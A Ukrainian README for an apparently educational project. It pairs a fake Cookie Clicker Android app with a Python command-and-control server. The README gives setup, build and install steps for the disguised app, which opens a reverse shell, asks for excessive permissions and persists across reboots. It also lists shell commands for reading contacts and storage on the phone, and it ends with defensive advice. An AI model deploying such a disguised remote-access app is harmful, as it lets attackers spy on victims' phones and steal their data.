# FakeClicker

Навчальний проєкт для курсу з кібербезпеки. Демонструє загрози від встановлення довільних APK з інтернету.

**Використовувати тільки на власних тестових пристроях у навчальному середовищі.**

---

## Структура

```
fakeClicker/
├── fakeClickerApp/   # Android APK (Cookie Clicker)
└── fakeClickerC2/    # C2 сервер (TUI на Python)
```

---

## fakeClickerApp — Android APK

Cookie Clicker з темним шоколадним UI. У фоні запускає TCP reverse shell і запитує широкий набір permissions для демонстрації.

### Що демонструє

| Техніка | Деталі |
|---------|--------|
| Надмірні permissions | Contacts, SMS, Call Log, Camera, Microphone, Location, Storage |
| Persistence | `BOOT_COMPLETED` receiver — сервіс стартує після ребуту без відкриття застосунку |
| Background execution | Foreground Service з нейтральним повідомленням "Syncing cookie data…" |
| Reverse shell | TCP з'єднання до C2, reconnect кожні 10с автоматично |

### Налаштування перед збіркою

Відкрий `fakeClickerApp/app/src/main/java/tech/fakeclicker/ReverseShellService.kt` і встав IP свого ноутбука:

```kotlin
private val C2_IP = "192.168.1.X"  // твій локальний IP
private val C2_PORT = 4444
```

> Для Android емулятора використовуй `10.0.2.2` — це стандартний шлюз до хост-машини.

### Збірка та встановлення

```bash
cd fakeClickerApp

# Зібрати debug APK
./gradlew assembleDebug

# APK буде тут:
# app/build/outputs/apk/debug/app-debug.apk

# Встановити через ADB (емулятор або телефон з USB debugging)
adb install app/build/outputs/apk/debug/app-debug.apk
```

### Android версії та що змінилось

| Функція | API 23-25 | API 26-28 | API 29 | API 30+ | API 33+ |
|---------|-----------|-----------|--------|---------|---------|
| Runtime permissions | ✅ | ✅ | ✅ | ✅ | ✅ |
| Background location | Вільно | Обмежено | Окремий дозвіл | Складніше | Складніше |
| Background services | Вільно | Обмежено | Обмежено | Більше обмежень | Більше обмежень |
| Scoped storage | ❌ | ❌ | Частково | ✅ | ✅ |
| Гранулярні media perms | ❌ | ❌ | ❌ | ❌ | ✅ |

---

## fakeClickerC2 — C2 сервер

TUI на Python (Textual, Catppuccin Macchiato). Приймає кілька одночасних підключень від APK, дозволяє перемикатись між сесіями.

### Вигляд

```
┌─ FakeClicker C2 ──────────────────── 3 connected ─────────────┐
│ SESSIONS            │ [1] Google Pixel 6 | Android 13          │
│ > [1] Pixel 6       │                                          │
│   [2] Samsung A32   │ [*] Google Pixel 6 | Android 13 (API 33) │
│   [3] Emulator      │ [*] shell ready                          │
│                     │ $ whoami                                  │
│                     │ u0_a112                                   │
│                     │ $ ls /sdcard/DCIM                         │
│                     │ Camera/                                   │
│ $ _                                                             │
└─────────────────────────────────────────────────────────────────┘
  Tab: Next session    Ctrl+C: Quit
```

### Встановлення

```bash
cd fakeClickerC2
python -m venv venv
venv/bin/pip install -r requirements.txt
```

### Запуск

```bash
cd fakeClickerC2
venv/bin/python c2.py              # слухає на 0.0.0.0:4444
venv/bin/python c2.py --port 5555  # інший порт
```

### Керування в TUI

| Дія | Команда |
|-----|---------|
| Перемкнути сесію | `Tab` або клік на імені |
| Надіслати команду | ввести + `Enter` |
| Вийти | `Ctrl+C` |

### Корисні команди для звіту

```bash
# Інформація про пристрій
getprop ro.product.model
getprop ro.build.version.release
id

# Що APK може прочитати
content query --uri content://contacts/phones
ls /sdcard/
cat /sdcard/Download/

# Процеси та permissions
ps -A | grep fakeclicker
pm list permissions -g -d
```

---

## Тестування на емуляторі

1. `Tools → Device Manager → Create Virtual Device` в Android Studio
2. Обери Phone → Pixel 6, System Image → API 33
3. Запусти емулятор
4. Встанови `C2_IP = "10.0.2.2"` в `ReverseShellService.kt`
5. Збери і встанови APK: `./gradlew assembleDebug && adb install ...`
6. Запусти C2: `venv/bin/python c2.py`
7. Відкрий Cookie Clicker на емуляторі — сесія з'явиться автоматично

## Тестування на реальному телефоні

1. Увімкни USB Debugging: Settings → About Phone → тисни Build Number 7 разів → Developer Options → USB Debugging
2. Підключи кабелем: `adb devices` — має показати серійний номер
3. Встав локальний IP ноутбука в `C2_IP`
4. `adb install app/build/outputs/apk/debug/app-debug.apk`
5. Запусти C2, відкрий застосунок

---

## Захист (для звіту)

- Встановлювати APK тільки з Google Play або перевірених джерел
- Перевіряти запитувані permissions перед встановленням — якщо клікер просить доступ до контактів, це підозріло
- Вмикати Google Play Protect
- Оновлювати Android — кожна версія додає нові обмеження для background activity
- Перевіряти активні сервіси: Settings → Apps → Running services
